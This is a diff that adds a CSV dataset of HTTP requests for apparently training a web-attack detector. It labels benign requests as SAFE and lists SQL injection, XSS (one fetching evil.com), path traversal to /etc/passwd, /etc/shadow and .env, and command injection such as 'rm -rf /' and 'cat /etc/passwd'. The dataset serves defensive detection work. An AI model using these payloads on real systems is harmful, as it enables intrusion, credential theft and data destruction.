@@ -1,0 +1,81 @@
+text,label
+GET /,SAFE
+GET /home,SAFE
+GET /index.html,SAFE
+GET /about,SAFE
+GET /contact,SAFE
+GET /products,SAFE
+GET /products?id=12,SAFE
+GET /products?id=45,SAFE
+GET /products?category=electronics,SAFE
+GET /products?category=clothing,SAFE
+GET /search?q=iphone,SAFE
+GET /search?q=laptop,SAFE
+GET /search?q=wireless+mouse,SAFE
+GET /search?q=headphones,SAFE
+GET /blog,SAFE
+GET /blog/how-to-buy-a-laptop,SAFE
+GET /cart,SAFE
+POST /cart/add product_id=12&qty=1,SAFE
+POST /cart/add product_id=15&qty=2,SAFE
+GET /checkout,SAFE
+POST /checkout address=NY&payment=card,SAFE
+POST /login username=john&password=pass123,SAFE
+POST /login username=alice&password=qwerty,SAFE
+POST /login username=bob&password=secure123,SAFE
+GET /profile?id=21,SAFE
+GET /profile?id=42,SAFE
+GET /orders,SAFE
+GET /orders?status=completed,SAFE
+GET /orders?status=pending,SAFE
+GET /order/10234,SAFE
+POST /review product_id=10&rating=5&comment=Good+product,SAFE
+POST /review product_id=11&rating=4&comment=Fast+delivery,SAFE
+GET /support,SAFE
+POST /support message=Need+help+with+order,SAFE
+GET /faq,SAFE
+GET /settings,SAFE
+
+GET /login?username=admin' OR '1'='1,SQLI
+GET /login?u=admin' OR 1=1 --,SQLI
+POST /login username=admin'--&password=abc,SQLI
+GET /search?id=1 UNION SELECT username,password FROM users,SQLI
+GET /item?id=10 OR 1=1,SQLI
+GET /product?id=5 AND 1=0 UNION SELECT credit_card FROM payments,SQLI
+GET /login?user=admin%27%20OR%201%3D1,SQLI
+GET /login?user=admin')--,SQLI
+POST /auth user=admin' OR 'x'='x,SQLI
+GET /data?id=3; DROP TABLE users;,SQLI
+GET /account?id=7 UNION ALL SELECT NULL,NULL,NULL,SQLI
+GET /api/user?id=5 OR sleep(5),SQLI
+GET /filter?price=100 OR 1=1,SQLI
+
+GET /search?q=<script>alert(1)</script>,XSS
+GET /comment?msg=<img src=x onerror=alert(1)>,XSS
+POST /feedback message=<script>document.cookie</script>,XSS
+GET /profile?name=<svg onload=alert(1)>,XSS
+GET /test?<script>alert('XSS')</script>,XSS
+GET /search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E,XSS
+GET /input?data=<iframe src=javascript:alert(1)>,XSS
+POST /post content=<body onload=alert(1)>,XSS
+GET /xss?payload=<img src=1 onerror=alert(document.domain)>,XSS
+GET /comment?text=<script>fetch('http://evil.com')</script>,XSS
+GET /chat?msg=<marquee onstart=alert(1)>,XSS
+
+GET /?page=../../etc/passwd,PATH_TRAVERSAL
+GET /download?file=../../../etc/shadow,PATH_TRAVERSAL
+GET /view?path=../config/settings.py,PATH_TRAVERSAL
+GET /open?file=../../../../windows/system32,PATH_TRAVERSAL
+GET /load?module=../../../../boot.ini,PATH_TRAVERSAL
+GET /image?name=../../uploads/private.jpg,PATH_TRAVERSAL
+GET /api/read?file=../.env,PATH_TRAVERSAL
+GET /static?file=../../../../var/log/auth.log,PATH_TRAVERSAL
+GET /export?path=../db.sqlite3,PATH_TRAVERSAL
+GET /logs?file=../../app.log,PATH_TRAVERSAL
+
+GET /ping?ip=127.0.0.1;ls,COMMAND_INJECTION
+GET /ping?host=8.8.8.8 && cat /etc/passwd,COMMAND_INJECTION
+POST /execute cmd=whoami,COMMAND_INJECTION
+GET /run?cmd=rm -rf /,COMMAND_INJECTION
+GET /system?cmd=netstat -an,COMMAND_INJECTION
+POST /shell command=python -c "import os;os.system('id')",COMMAND_INJECTION
